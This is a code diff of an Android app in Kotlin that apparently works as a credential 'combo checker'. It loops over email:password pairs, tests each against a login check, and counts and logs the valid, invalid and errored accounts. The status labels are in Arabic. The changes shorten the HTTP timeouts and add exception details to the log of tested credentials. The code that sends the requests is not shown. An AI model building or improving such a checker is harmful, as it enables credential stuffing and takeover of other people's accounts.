@@ -27,8 +27,8 @@ import java.util.concurrent.TimeUnit
 class MainActivity : AppCompatActivity() {
     private val client by lazy {
         OkHttpClient.Builder()
-            .connectTimeout(20, TimeUnit.SECONDS)
-            .readTimeout(25, TimeUnit.SECONDS)
+            .connectTimeout(15, TimeUnit.SECONDS)
+            .readTimeout(15, TimeUnit.SECONDS)
             .build()
     }
     private val results = mutableListOf<Triple<String, String, String>>()
@@ -72,7 +72,7 @@ class MainActivity : AppCompatActivity() {
             var invalid = 0
             var err = 0
             for ((email, pwd) in combos) {
-                val (st, _) = checkOne(email, pwd)
+                val (st, detail) = checkOne(email, pwd)
                 results.add(Triple(email, pwd, st))
                 when (st) {
                     "valid" -> valid++
@@ -81,7 +81,7 @@ class MainActivity : AppCompatActivity() {
                 }
                 done++
                 status.text = "$done/$total   صح $valid   خطأ $invalid   أخطاء $err"
-                log.append("$email:$pwd -> $st\n")
+                log.append("$email:$pwd -> $st ($detail)\n")
                 (log.parent as? ScrollView)?.let { sv ->
                     sv.post { sv.fullScroll(ScrollView.FOCUS_DOWN) }
                 }
@@ -118,7 +118,7 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
             } catch (e: Exception) {
-                "error" to (e.message ?: "net")
+                "error" to (e.javaClass.simpleName + ": " + (e.message ?: "net"))
             }
         }
 
